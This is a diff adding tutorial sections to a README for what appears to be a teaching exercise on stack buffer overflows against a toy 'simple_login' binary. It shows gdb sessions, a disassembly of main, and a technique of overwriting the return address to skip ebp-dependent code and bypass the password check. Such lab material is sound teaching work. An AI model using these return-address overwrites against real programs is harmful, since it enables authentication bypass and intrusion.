@@ -204,3 +204,124 @@ and makes `simple_login` execute code at that address.
 jump to 0xFFFFFFFF. `make gdb-overflow` runs the same in gdb and prints
 relevant information while running. You can see that `verify_password` returns
 execution to 0xFFFFFF.
+
+### Avoiding SIGSEGV
+
+When we manipulate the return address it should point to a page mapped to the
+process otherwise a SEGFAULT will be caused. Since 0xFFFFFFFF is an error code
+of `mmap` this address should never be mapped to the process and should always
+cause a SEGFAULT.
+
+But even if we were to overwrite the return address with its original value
+(`0x8048455 <main+34>`) a SEGFAULT will be caused. This is because the `ebp`
+register is saved before the return address and will be always be overwritten
+by `scanf` as well. In `verify_password+141` the original value is restored
+from the stack so `main` can access its local variables again, but since its
+value changed (to `0x78787878` to be precise) `main` will cause a SEGFAULT
+when accessing its local variables.
+
+  * Start gdb and run `simple_login` with input that overwrites the return
+    address. But overwrite it with its original value.
+
+    ```
+    $ make overflow
+    $ ./overflow 0x8048455 > overflow.txt
+    $ gdb ./simple_login
+    (gdb) break verify_password
+    (gdb) run < overflow.txt
+    ```
+  * gdb will now stop when `verify_password` is called
+  * show the original rerurn address and saved `ebp`
+
+    ```
+    (gdb) print/a *((void **)$ebp + 1)
+    $1 = 0x8048455 <main+34>
+    (gdb) print/a *(void **)$ebp
+    $1 = 0xffffdcc8
+    ```
+  * continue until `scanf` returned and show the overwritten return address
+    and the saved `ebp`
+
+    ```
+    (gdb) break *(verify_password+33)
+    (gdb) continue
+    (gdb) print/a *((void **)$ebp + 1)
+    $1 = 0x8048455 <main+34>
+    (gdb) print/a *(void **)$ebp
+    $1 = 0x78787878
+    ```
+  * continue until `verify_password` returned
+
+    ```
+    (gdb) break *(verify_password+142)
+    (gdb) continue
+    (gdb) stepi
+    (gdb) print/a $ebp
+    $1 = 0x78787878
+    (gdb) set disassembly-flavor intel`
+    (gdb) disassemble
+    ```
+
+    ```asm
+    Dump of assembler code for function main:
+       0x08048433 <+0>:     lea    ecx,[esp+0x4]
+       0x08048437 <+4>:     and    esp,0xfffffff0
+       0x0804843a <+7>:     push   DWORD PTR [ecx-0x4]
+       0x0804843d <+10>:    push   ebp
+       0x0804843e <+11>:    mov    ebp,esp
+       0x08048440 <+13>:    push   ecx
+       0x08048441 <+14>:    sub    esp,0x24
+       0x08048444 <+17>:    mov    DWORD PTR [esp],0x804856f
+       0x0804844b <+24>:    call   0x8048308 <puts@plt>
+       0x08048450 <+29>:    call   0x80483a4 <verify_password>
+    => 0x08048455 <+34>:    mov    DWORD PTR [ebp-0x8],eax
+       0x08048458 <+37>:    cmp    DWORD PTR [ebp-0x8],0x0
+       0x0804845c <+41>:    jne    0x8048473 <main+64>
+       0x0804845e <+43>:    mov    DWORD PTR [esp],0x804858b
+       0x08048465 <+50>:    call   0x8048308 <puts@plt>
+       0x0804846a <+55>:    mov    DWORD PTR [ebp-0x18],0x1
+       0x08048471 <+62>:    jmp    0x8048486 <main+83>
+       0x08048473 <+64>:    mov    DWORD PTR [esp],0x8048598
+       0x0804847a <+71>:    call   0x8048308 <puts@plt>
+       0x0804847f <+76>:    mov    DWORD PTR [ebp-0x18],0x0
+       0x08048486 <+83>:    mov    eax,DWORD PTR [ebp-0x18]
+       0x08048489 <+86>:    add    esp,0x24
+       0x0804848c <+89>:    pop    ecx
+       0x0804848d <+90>:    pop    ebp
+       0x0804848e <+91>:    lea    esp,[ecx-0x4]
+       0x08048491 <+94>:    ret
+    End of assembler dump.
+    ```
+  * The next instruction causes a SEGFAULT because it will try to access a
+    variable relative to `ebp`.
+
+    ```
+    (gdb) stepi
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x08048455 in main (argc=<optimized out>, argv=<optimized out>) at login.c:17
+    17      in login.c
+    ```
+
+We could try to guess the saved value of `ebp` but normally the address of the
+stack is randomized. gdb tries to disable that and we could use `0xffffdcc8`
+(run `gdb -x gdb/ebp.txt ./simple_login` repeatedly), but we cannot ensure that
+randomization is disabled. (You can try this by running `make gdb-overflow-nothing`.)
+
+But if we were to jump to `0x08048489 <main+86>` we would skip all instructions
+relying on `ebp` and execute the postamble of `main` directly. `main` will
+return cleanly and the process will exit normally.
+
+### `exit(0)`
+
+The return value of `main` will be used as the programs exit code. The return
+value is stored in `eax` and since we skip `mov eax,DWORD PTR [ebp-0x18]`
+`main` does not set its own return value but uses current value of `eax`.
+`eax` will hold the return value of `verify_password`. This return value is `1`
+if the input password matched the expected password and `0` otherwise.
+`simple_login` will therefore exit successfully if the password did **not**
+match and with `1` if the password matched.
+
+Therefore `overflow` will by default generate input that fails the password
+comparison, but can be told to generate a malicious input that will satsify the
+password comparison by passing `-v`.
